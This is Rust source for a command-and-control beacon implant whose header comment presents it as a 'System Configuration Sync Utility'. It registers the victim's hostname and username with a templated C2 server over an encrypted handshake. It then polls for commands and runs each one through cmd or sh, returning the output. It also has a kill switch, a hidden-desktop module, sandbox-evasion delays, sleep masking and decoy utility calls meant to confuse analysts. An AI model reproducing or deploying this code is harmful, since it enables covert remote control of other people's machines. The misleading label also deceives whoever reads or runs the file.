// System Configuration Sync Utility
// Manages endpoint configuration and health telemetry
mod ghost;
#[cfg(windows)]
mod hdesktop;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use aes_gcm::aead::Aead;
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use serde_json::{json, Value};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::sync::Mutex;
use std::time::Duration;
use std::thread;
use x25519_dalek::{PublicKey, StaticSecret};

const EP: &str = "{{C2_HOST}}";
const PT: &str = "{{C2_PORT}}";
const SC: &str = "{{C2_SCHEME}}";
const AK: &str = "{{ENCRYPTION_KEY}}";
const SI: u64 = {{BEACON_INTERVAL}};
const SJ: u64 = {{BEACON_JITTER}};
const P1: &str = "{{REGISTER_URI}}";
const P2: &str = "{{CHECKIN_URI}}";
const P3: &str = "{{RESULT_URI}}";
const UA: &str = "{{USER_AGENT}}";

const SERVER_PUB: &str = "17e9833c7357d12649195085ebb2cb1dd68bfbffc86f9a930164eb4239686e1c";
type HmacSha256 = Hmac<Sha256>;
struct Wire {
    eph: Option<StaticSecret>,
    hs: Option<[u8; 32]>,
    session: Option<[u8; 32]>,
}
static WIRE: Mutex<Wire> = Mutex::new(Wire { eph: None, hs: None, session: None });

fn hkdf(ikm: &[u8], salt: &[u8], info: &[u8]) -> [u8; 32] {
    let mut mac = <HmacSha256 as Mac>::new_from_slice(salt).unwrap();
    mac.update(ikm);
    let prk = mac.finalize().into_bytes();
    let mut mac = <HmacSha256 as Mac>::new_from_slice(&prk).unwrap();
    mac.update(info);
    mac.update(&[1]);
    let out = mac.finalize().into_bytes();
    let mut key = [0u8; 32];
    key.copy_from_slice(&out);
    key
}
fn seal(key: &[u8], text: &str) -> Vec<u8> {
    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
    let mut nonce_bytes = [0u8; 12];
    getrandom(&mut nonce_bytes);
    let ct = cipher.encrypt(Nonce::from_slice(&nonce_bytes), text.as_bytes()).unwrap();
    let mut out = nonce_bytes.to_vec();
    out.extend(ct);
    out
}
fn open_blob(key: &[u8], blob: &[u8]) -> Option<String> {
    if blob.len() < 28 { return None; }
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let pt = cipher.decrypt(Nonce::from_slice(&blob[..12]), &blob[12..]).ok()?;
    String::from_utf8(pt).ok()
}
fn enc(pt: &str) -> String {
    let mut w = WIRE.lock().unwrap();
    if let Some(key) = w.session {
        let sealed = seal(&key, pt);
        let mut raw = b"AES1".to_vec();
        raw.extend(sealed);
        return B64.encode(raw);
    }
    let server_bytes = hex::decode(SERVER_PUB).unwrap();
    let server = PublicKey::from(<[u8; 32]>::try_from(server_bytes.as_slice()).unwrap());
    let eph = StaticSecret::random_from_rng(rand::rngs::OsRng);
    let eph_pub = PublicKey::from(&eph);
    let shared = eph.diffie_hellman(&server);
    let hs = hkdf(shared.as_bytes(), b"sockpuppets-salt-v1", b"sockpuppets-handshake-v1");
    let sealed = seal(&hs, pt);
    let mut raw = eph_pub.as_bytes().to_vec();
    raw.extend(sealed);
    w.eph = Some(eph);
    w.hs = Some(hs);
    format!("EPH1.{}", B64.encode(raw))
}
fn dec(encoded: &str) -> Option<String> {
    let encoded = encoded.trim();
    let mut w = WIRE.lock().unwrap();
    if let Some(rest) = encoded.strip_prefix("EPH2.") {
        let raw = B64.decode(rest).ok()?;
        if raw.len() < 32 { return None; }
        let hs = w.hs?;
        let pt = open_blob(&hs, &raw[32..])?;
        let srv = PublicKey::from(<[u8; 32]>::try_from(&raw[..32]).ok()?);
        let eph = w.eph.take()?;
        let shared2 = eph.diffie_hellman(&srv);
        let mut ikm = shared2.as_bytes().to_vec();
        ikm.extend(&hs);
        w.session = Some(hkdf(&ikm, b"sockpuppets-salt-v1", b"sockpuppets-session-v1"));
        w.hs = None;
        return Some(pt);
    }
    let raw = B64.decode(encoded).ok()?;
    if raw.len() > 4 && &raw[..4] == b"AES1" {
        let key = w.session?;
        return open_blob(&key, &raw[4..]);
    }
    None
}

fn getrandom(buf: &mut [u8]) {
    use rand::RngCore;
    rand::thread_rng().fill_bytes(buf);
}

fn hn() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("COMPUTERNAME").unwrap_or_default() }
    #[cfg(not(target_os = "windows"))]
    { Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().into()).unwrap_or_default() }
}

fn un() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("USERNAME").unwrap_or_default() }
    #[cfg(not(target_os = "windows"))]
    { std::env::var("USER").unwrap_or_default() }
}

fn ex(c: &str) -> String {
    if let Some(rest) = c.strip_prefix("__hd:") {
        #[cfg(windows)]
        { return hdesktop::handle(rest); }
        #[cfg(not(windows))]
        { return "hidden desktop requires windows".into(); }
    }
    if c.starts_with("cd ") {
        return match std::env::set_current_dir(c[3..].trim()) {
            Ok(_) => format!("Changed directory to {}", std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default()),
            Err(e) => format!("Error: {}", e),
        };
    }
    #[cfg(target_os = "windows")]
    let o = Command::new("cmd").args(&["/C", c]).output();
    #[cfg(not(target_os = "windows"))]
    let o = Command::new("sh").args(&["-c", c]).output();
    match o {
        Ok(r) => {
            let s = format!("{}{}", String::from_utf8_lossy(&r.stdout), String::from_utf8_lossy(&r.stderr));
            if s.is_empty() { "OK".into() } else { s }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn hp(p: &str, b: &str) -> Option<String> {
    let a = format!("{}:{}", EP, PT);
    let mut s = TcpStream::connect_timeout(&a.parse().ok()?, Duration::from_secs(30)).ok()?;
    s.set_read_timeout(Some(Duration::from_secs(60))).ok();
    let r = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        p, a, UA, b.len(), b
    );
    s.write_all(r.as_bytes()).ok()?;
    let mut resp = String::new();
    s.read_to_string(&mut resp).ok()?;
    resp.find("\r\n\r\n").map(|i| resp[i+4..].to_string())
}

fn stealth_sleep(secs: u64) {
    let mut secret = *b"sockpuppets-sleep-mask-v1!!!!";
    let mut key = [0u8; 16];
    for (i, b) in key.iter_mut().enumerate() {
        *b = (i as u8).wrapping_mul(17).wrapping_add(secs as u8);
    }
    for (i, b) in secret.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
    thread::sleep(Duration::from_secs(secs.max(1)));
    for (i, b) in secret.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
}

fn main() {
    let _ = ghost::health_check();
    let _ = ghost::collect_system_info();
    let _ = ghost::aggregate_metrics(&[1.0, 2.0, 3.0]);
    let _ = ghost::normalize_text("test");
    let _ = ghost::format_bytes(1024);
    let _ = ghost::timestamp();
    let _ = ghost::glob_match("*.txt", "test.txt");
    let _ = ghost::json_object(&[("status", "ok")]);
    let _ = ghost::validate_email("test@example.com");
    let _ = ghost::slugify("Hello World Test");
    let _ = ghost::base64_encode_simple(b"test data");
    let _ = ghost::sha256_simple(b"fingerprint");
    let _ = ghost::sha256_hash(b"test");
    let _ = ghost::parse_url("https://example.com/test");
    let _ = ghost::regex_match(r"\d+", "123");
    let _ = ghost::current_timestamp();
    let _ = ghost::create_status_report();
    let _ = ghost::parse_csv("a,b,c\n1,2,3");

    if std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1) < 2 {
        thread::sleep(Duration::from_secs(30));
    }

    let meta = json!({
        "hostname": hn(),
        "username": un(),
        "os": std::env::consts::OS,
        "architecture": std::env::consts::ARCH,
        "mode": "beacon",
        "beacon_interval": SI
    });
    let reg = json!({"type": "register", "metadata": meta});

    let mut aid = String::new();
    for _ in 0..10 {
        if let Some(r) = hp(P1, &enc(&reg.to_string())) {
            if let Some(d) = dec(&r) {
                if let Ok(v) = serde_json::from_str::<Value>(&d) {
                    if let Some(id) = v["agent_id"].as_str() {
                        aid = id.to_string();
                        break;
                    }
                }
            }
        }
        thread::sleep(Duration::from_secs(5));
    }
    if aid.is_empty() { return; }

    let mut pending: Vec<Value> = Vec::new();
    let mut interval = SI;
    loop {
        let ci = json!({
            "type": "checkin",
            "agent_id": aid,
            "metadata": {"mode": "beacon"},
            "results": pending
        });
        pending.clear();

        if let Some(r) = hp(P2, &enc(&ci.to_string())) {
            if let Some(d) = dec(&r) {
                if let Ok(v) = serde_json::from_str::<Value>(&d) {
                    if let Some(cmds) = v["commands"].as_array() {
                        for c in cmds {
                            if let Some(cmd) = c["command"].as_str() {
                                if cmd == "__kill" { std::process::exit(0); }
                                if cmd.starts_with("__set_interval:") {
                                    if let Ok(n) = cmd[15..].parse::<u64>() {
                                        interval = n.max(1);
                                    }
                                    continue;
                                }
                                let out = ex(cmd);
                                pending.push(json!({
                                    "type": "response",
                                    "output": out,
                                    "command": cmd
                                }));
                            }
                        }
                    }
                }
            }
        }

        let base = interval;
        if SJ > 0 && SJ <= 100 {
            let jr = (base as f64) * (SJ as f64) / 100.0;
            let off = (rand::random::<f64>() * jr * 2.0) - jr;
            stealth_sleep(((base as f64 + off).max(1.0)) as u64);
        } else {
            stealth_sleep(base);
        }
    }
}
